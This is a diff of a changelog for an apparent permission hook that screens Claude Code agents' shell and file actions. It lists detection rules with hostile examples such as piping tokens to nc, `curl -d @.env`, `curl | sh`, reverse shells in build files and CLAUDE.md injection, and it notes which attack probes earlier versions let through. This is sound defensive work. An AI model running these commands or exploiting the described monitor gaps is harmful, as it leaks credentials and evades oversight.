@@ -12,36 +12,63 @@ when we started counting. Everything in this session is 0.2.0.
 Fixes from an end-to-end eval of 0.11.0 (562 benign operations, 283 attack probes, 4 real Claude Code
 sessions). Every attack class below was auto-approved by 0.11.0 and 0.10.0.
 
-- **A secret-shaped variable sent to the network denies.** curl, wget, nc, socat, `iwr`/`irm` with
-  `$GITHUB_TOKEN`-style names (`SECRET`, `TOKEN`, `PASSWORD`, `KEY`, `PASS`, `AUTH`, `PAT` parts;
-  `AWS_REGION` and `AWS_PROFILE` are not secrets) in the URL, a body (`-d`, `--data*`, `-F`), the user
-  agent, or piped in (`echo $TOKEN | nc host 1`). A header or credential value (`-H "x-api-key: $KEY"`,
-  `-u me:$TOKEN`, `-su`, `iwr -Headers @{..}`) is how a token is meant to be sent: it prompts. A curl or
-  wget with any variable never auto-approves. Literal text (`git commit -m '... $API_KEY'`) is not a send.
+- **A secret-shaped variable sent to the network denies.** curl, wget, nc, socat, `iwr`/`irm` with an
+  upper-case environment name with a credential word as a `_` part (`TOKEN(S)`, `SECRET(S)`, `PASS`,
+  `PASSWORD`, `API_KEY`, `PRIVATE_KEY`, `CREDENTIALS`, `PAT`, `KEY_BASE`), ending in `KEY`/`AUTH`, or an
+  AWS key name (`$GITHUB_TOKEN`, `$GH_TOKEN_2`, `$SECRET_KEY_BASE`, `$DB_PASS`, `$AWS_SECRET_ACCESS_KEY`;
+  not `$MAX_TOKENS`, `$TOKEN_TYPE`, `$NEXT_PAGE_TOKEN`, `$KEY_FILE`, `$SSH_KEY_PATH`, `$AWS_REGION` or a
+  lower-case `$key`) in the URL, a body (`-d`,
+  `--data*`, `-F`), the user agent, or piped in (`echo $TOKEN | nc host 1`). Quotes are read as the shell
+  reads them (`"?t='$TOKEN'"` expands), and curl clusters as curl does (`-du=$TOKEN` is a body). A header
+  or credential value (`-H "x-api-key: $KEY"`, `-u me:$TOKEN`, `-su`, `--oauth2-bearer`, a cookie,
+  `iwr -Headers @{..}`, `irm -Token`) is how a token is meant to be sent: it prompts. A curl or wget with
+  any variable never auto-approves. Literal text (`git commit -m '... $API_KEY'`) is not a send.
 - **Written commands are scanned.** Literal content a command writes (a heredoc body, `echo`/`printf`
-  words, a `sed -i` script) and Write/Edit content for a command-definition file (`package.json`,
-  `Makefile`, `build.rs`, `conftest.py`, `setup.py`, `pyproject.toml`, `.npmrc`, ...) get the shell scan:
-  a secret upload (`curl -d @.env`) or download-exec (`curl | sh`) denies. Content the hook cannot read
-  (`cp`, `cat x >`, `curl -o`, `wget`, `patch`, `git apply`, an unpack) into a command-definition file,
-  then a runner in the same command, prompts. Ordinary edits (`sed -i src/x.ts && npm test`) still
-  approve. Code that reads `.env` and posts it from JS/Python/Go source is not detected (accepted limit).
-- **Runner flags that load code prompt**: `--script-shell`, `go test -exec`, `cargo --config`,
-  `pytest -p`, `node -r`, `make SHELL=`, eslint/prettier plugins, and a `--config`/`-c`/`--dir`/`-C` or
-  `cd` into a temp dir or Downloads (a cloned payload). The project's own config files and sibling
-  checkouts still approve.
-- **Environment dumps prompt**: `env`, `printenv`, `export -p`, `ps e`, `echo $SECRET_NAME`,
-  PowerShell `Get-ChildItem Env:`.
+  words with their `\x63`/`\143` escapes decoded, a `sed -i` script) gets the shell scan: a secret
+  upload, reverse shell or download-exec (`curl | sh`) written and then run in the same command (a
+  runner, a shell, the file itself) denies; any of them in a command-definition file (`package.json`,
+  JSON-decoded, `Makefile`, `build.rs`, `conftest.py`, `pyproject.toml`, `composer.json`, `.husky/*`, any
+  case) denies from the shell and from Write/Edit, except an https installer line from a known host
+  (rustup, uv, bun, nodesource, pnpm, nvm, docker), which prompts. An installer line in a README,
+  Dockerfile, docs or a setup script is text and is not denied. A runner (npm/pnpm/yarn/bun, make, cargo,
+  pytest) whose on-disk scripts, Makefile, `build.rs` or `conftest.py` hold one prompts. Content the hook cannot read (`cp`, `cat x >`, `curl -o`,
+  `curl >`, `| tee`, `wget`, `patch`, `git apply`, an unpack) into a command-definition file, or from
+  outside the project into a file a runner loads (a test, `jest.config.js`, `.eslintrc.js`,
+  `sitecustomize.py`), then a runner in the same command (in a loop or trap: anywhere), prompts; so does a
+  literal Makefile or package.json whose commands do not each approve on their own (or a Makefile with `$(shell)`, `include`, `SHELL :=`, a `\` continuation). Ordinary edits
+  (`sed -i src/x.ts && npm test`) still approve. Code that reads `.env` and posts it from JS/Python/Go
+  source is not detected (accepted limit).
+- **Downloads and unpacks**: `curl -O` checks the remote name as `-o` checks its target (no
+  agent-instruction file, command definition, dotfile, dot directory, or a file under a home dot directory like `~/.claude`, `~/.config/gh`); an unpack into
+  `.git` or `.claude`, or a downloaded archive (`curl -O`, or piped: `curl .. | tar xz`) unpacked into
+  the project root, prompts; so does git after
+  an unpack in the same command (an archive `.git/config` runs on it), and an unpack after a `cd` to an unknown directory.
+- **Runner flags that load code prompt**: `--script-shell`, `--node-options`, `npm_config_*`,
+  `go test -exec`, `cargo --config`, `pytest -p`, `node -r`, `bun --preload`, `make SHELL=`,
+  eslint/prettier plugins and formatters, jest/vitest/mocha `--runner`/`--reporter`/`--rootDir`/inline
+  JSON `--config`, any runner argument in a temp dir or Downloads (`pytest /tmp/x`, `-vettool=/tmp/x`),
+  and a `cd` (`cd --` too) into a temp dir, `/dev/shm` or Downloads. The project's own config files,
+  output paths in `/tmp` and sibling checkouts still approve.
+- **Environment dumps prompt**: `env`, bare `printenv`, `export -p`, `ps e`, `echo $SECRET_NAME`, awk
+  `ENVIRON`, jq `env`/`$ENV`, yq `env()`, PowerShell `Get-ChildItem Env:`, `env:G*`, a computed path,
+  `GetEnvironmentVariable`. `printenv PATH`, `ps -C node`, a test operand (`[ -n "$KEY" ]`),
+  `${KEY:+set}` and an escaped `\$TOKEN` still approve. `npm config get` of an auth or token key prompts.
+- **A `.pem`/`.key` under a project `test/`, `tests/`, `fixtures/`, `__fixtures__/` or `testdata/` dir**
+  is not denied but prompts when a stage reads it (a listing or `git add` keeps its result); after a `cd`
+  or `ln` in the command, or through a symlink out of the project, a read denies.
 - **`~/.bash_aliases`, `~/.bash_login`, `~/.bash_logout` are rc files** (writes ask).
-- **PowerShell parity with bash**: `Remove-Item`, `Set-Content`, `Add-Content`, `Out-File`, `Copy-Item
-  -Destination`, `>` and `*>>` onto shellter's files or trust store deny and onto Claude settings ask,
-  after a readable `Set-Location` too; `Add-Content`/`Out-File`/`>` of injection text into CLAUDE.md denies
-  (named, positional or piped content).
+- **PowerShell parity with bash**: `Remove-Item`, `Set-Content`, `Add-Content`, `Out-File`, `New-Item`,
+  `Copy-Item`, `Expand-Archive`, `[IO.File]::Write*`/`Move`/`Delete`, `[IO.Directory]`, `>` and `*>>` onto shellter's files, hooks dir or
+  trust store deny and onto Claude settings ask: with abbreviated or colon-bound parameters, wildcards,
+  inside `& { }` / `% { }` / `if`, piped from `Get-Item`, after a `Set-Location` (a wildcard one too; `Set-Location ~; Remove-Item -Recurse .claude`).
+  A `Copy-Item` into `~/.claude` is judged by the file it writes, as bash `cp` is.
+  Injection text into CLAUDE.md denies for every write shape (`New-Item -Value`, `Tee-Object`,
+  `[IO.File]::AppendAllText`, a `>` inside the value).
 - **Write/Edit of a `.git/hooks` file with download-exec content denies** (bash already did).
-- **False denies removed**: Glob lists names and reads nothing, so only a walked secret directory
-  (`.ssh/**`) denies, not `**/.env*`; `.pem`/`.key` under a project `test/`, `tests/`, `fixtures/`,
-  `__fixtures__/` or `testdata/` dir is fixture data; `cat ~/.gitconfig` names the right reason.
+- **False denies removed**: Glob lists names and reads nothing, so it never denies; `cat ~/.gitconfig`
+  names the right reason.
 
-2807 tests in test-hooks.js (2657 at 0.11.0).
+3140 tests in test-hooks.js (2657 at 0.11.0).
 
 ## [0.11.0] - 2026-11-18
 
